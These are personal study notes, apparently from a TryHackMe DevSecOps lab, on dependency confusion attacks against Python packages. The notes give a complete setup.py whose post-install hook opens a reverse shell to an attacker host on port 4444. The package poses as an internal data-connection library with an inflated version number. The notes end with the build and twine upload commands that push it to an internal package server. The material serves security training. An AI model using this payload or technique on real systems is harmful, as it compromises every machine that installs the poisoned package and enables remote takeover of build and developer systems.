---
title: "Dependency Management"
parent: "DevSecOps"
grand_parent: "6 - Misc THM Notes"
nav_order: 4
layout: default
---

# Dependency Management

The most basic Pip package requires the following structure:

```
package_name/
    package_name/
    __init__.py
    main.py
    setup.py
```
- **package_name** - This is the name of the package that we are creating.
- **init.py** - Each Pip package requires an init file that tells Python that there are files here that should be included in the build. In our case, we will keep this empty.
- **main.py** - The main file that will execute when the package is used. 
- **setup.py** - This is the file that contains the build and installation instructions. When developing Pip packages, you can use setup.py, setup.cfg, or pyproject.toml. However, since our goal is remote code execution, setup.py will be used since it is the simplest for this goal.

Example **main.py**:
```
#!/usr/bin/python3
def main():
   print ("Hello World")

if __name__=="__main__":
   main()
```
- This is simply filler code to ensure that the package does contain some code for the build. 

Example **setup.py**:
```
from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.2'

class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Hello World from installer, this proves our injection works")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')

setup(
        name='datadbconnect',
        url='https://github.com/labs/datadbconnect/',
        download_url='https://github.com/labs/datadbconnect/archive/{}.tar.gz'.format(VERSION),
        author='Tinus Green',
        author_email='tinus@notmyrealemail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''Dataset Connection Package '''
                  '''that can be used internally to connect to data sources '''),
        cmdclass={
            'install': PostInstallCommand
        },
)
```
- In order to inject code execution, we need to ensure that the package executes code once it is installed. Fortunately, setuptools, the tooling we use for building the package, has a built-in feature that allows us to hook in the post-installation step. This is usually used for legitimate purposes, such as creating shortcuts to the binaries once they are installed. However, combining this with Python's os library, we can leverage it to gain remote code execution.
- Note that the version has to be higher than the existing version

Then:
- `python3 setup.py sdist`
- and `twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080`
	- remember that `datadbconnect` is the name of the target library and `http://external.pypi-server.loc:8080` is the the internal dependency management server
